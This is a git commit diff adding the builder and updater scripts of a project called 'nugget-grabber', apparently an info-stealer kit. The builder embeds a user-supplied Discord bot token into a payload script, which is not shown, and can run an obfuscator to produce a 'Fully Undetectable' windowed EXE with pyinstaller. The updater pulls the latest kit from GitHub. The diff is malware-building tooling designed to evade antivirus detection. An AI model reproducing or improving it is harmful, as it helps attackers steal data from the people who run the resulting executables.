143253b26765c13b595cf43f4f897a85a50e542b
starshotaka90roirio <shrekandsex@gmail.com>
2024-09-26 15:28:39 +0100

    test

---
+++ builder.py
@@ -0,0 +1,97 @@
+import subprocess
+import os
+from cryptography.fernet import Fernet
+import base64
+import time
+from etc import updater
+from colorama import Fore
+
+updater.Update().update_checker
+
+
+intro = Fore.RED + """   
+                                               __
+              ____  __ __  ____   ____   _____/  |_ 
+             /    \|  |  \/ ___\ / ___\_/ __ \   __\ 
+            |   |  \  |  / /_/  > /_/  >  ___/|  |      Made by starshot
+            |___|  /____/\___  /\___  / \___  >__|      
+                 \/     /_____//_____/      \/     
+
+                    Welcome to builder
+        """
+
+
+print(intro)
+
+print("What do you want to do? \n [1] Build normal EXE \n [2] Make FUD (Fully Undetectable) EXE \n [3] Leave")
+
+while True:
+    choice = input("\n Make your choice: ").lower()
+    if choice == "1":
+        filename = 'nugget-v2.py'
+        filepath = os.path.join(os.getcwd(), filename)
+
+        os.system("cls")
+
+
+        token = input('Enter you discord bot token: ')
+        
+        e_token = base64.b64encode(token.encode())
+
+        with open(filepath, 'r', encoding='utf-8')as f:
+            content = f.read()
+            new_content = content.replace(f'"TOKEN"', f'{e_token}')
+
+
+        with open(filepath, 'w') as f:
+            f.write(new_content)
+        
+        subprocess.call(["pyinstaller", "--onefile", "--windowed", "etc/nugget-v2.py"])
+
+        break
+    
+    if choice == "2":
+        os.system("cls")
+
+        token = input("Enter your discord bot token: ")
+        e_tokenyetagain = base64.b64encode(token.encode())
+
+        filename = 'nugget-v2.py'
+        filepath = os.path.join(os.getcwd(), filename)
+
+        with open(filepath, 'r', encoding='utf-8')as f:
+            content = f.read()
+            new_content = content.replace(f'"TOKEN"', f'{e_tokenyetagain}')
+
+        with open(filepath, 'w') as f:
+            f.write(new_content)
+
+        print('Obfuscating file . . .')
+
+        time.sleep(1)
+
+        try:
+            subprocess.call(["python", "etc/obfuscate.py"])
+
+        except Exception as e:
+            print("Something went wrong . . . Error: " + e)
+
+        finally:
+            print("Compiling file... Give it a moment . . .")
+            time.sleep(2)
+            subprocess.call(["pyinstaller", "--onefile", "--windowed", "etc/Obfuscated_nugget-v2.py"])
+            os.system("cls")
+            print("All done!")
+
+        break
+
+
+
+    elif choice == "3":
+        print('goodbye')
+        break
+
+    else:
+        print("Choice invalid.")
+        os.system("cls")
+
---
+++ etc/updater.py
@@ -0,0 +1,75 @@
+import time
+import requests
+import zipfile
+import io
+import os
+
+class Update:
+    def __init__(self):
+        # Declare new version and links
+        self.version = '2.0'
+        self.zip = 'https://github.com/starshotaka90roirio/nugget-grabber/archive/refs/heads/main.zip'
+        self.github_version = 'https://raw.githubusercontent.com/starshotaka90roirio/nugget-grabber/main/updater.py'
+
+        self.update_checker()
+
+    
+    def update_checker(self):
+        code = requests.get(self.github_version).text
+
+        # Check version
+        if "self.version = '2.0.0'" in code:
+            print("nugget-grabber is up to date.")
+        else:
+            print("""
+                    ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
+                    ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
+                    ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
+                    ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
+                    ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
+                    ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
+                  
+                                    Your version is outdated!
+            """)
+            
+            choice = input("Do you want to update? [Y/N]").lower()
+            if choice == "y":
+                def download_github_repo(repo_url, destination_folder):
+                    # Extract username and repository name from the URL
+                    username, repo_name = repo_url.split('/')[-2:]
+
+
+                    # Construct the path to the Downloads folder
+                    # GitHub API endpoint to get the repository archive (ZIP format)
+                    archive_url = f"https://api.github.com/repos/starshotaka90roirio/nugget-grabber/zipball"
+                    try:
+                        # Send a GET request to the GitHub API
+                        response = requests.get(archive_url)
+                        response.raise_for_status()  # Raise an error for unsuccessful requests
+                        # Create a temporary in-memory buffer for the zip file
+                        zip_buffer = io.BytesIO(response.content)
+                        # Extract the contents of the ZIP file to the destination folder
+                        with zipfile.ZipFile(zip_buffer, 'r') as zip_ref:
+                            zip_ref.extractall(destination_folder)
+                        print(f"Repository downloaded successfully to {destination_folder}")
+                        time.sleep(4)
+                        os.system('cls')
+
+                    except requests.RequestException as e:
+                        print(f"Error downloading repository: {e}")
+
+
+                # Get the user's home directory
+                home_directory = os.path.expanduser("~")
+
+                # Construct the path to the Downloads folder
+                github_repo_url = "https://github.com/starshotaka90roirio/nugget-grabber"
+                download_folder = os.path.join(home_directory, "Downloads")
+
+                download_github_repo(github_repo_url, download_folder)
+
+            elif choice =='n':
+                os.system("cls")
+                print('Continue with your building process. . .')
+                time.sleep(4)
+                os.system("cls")
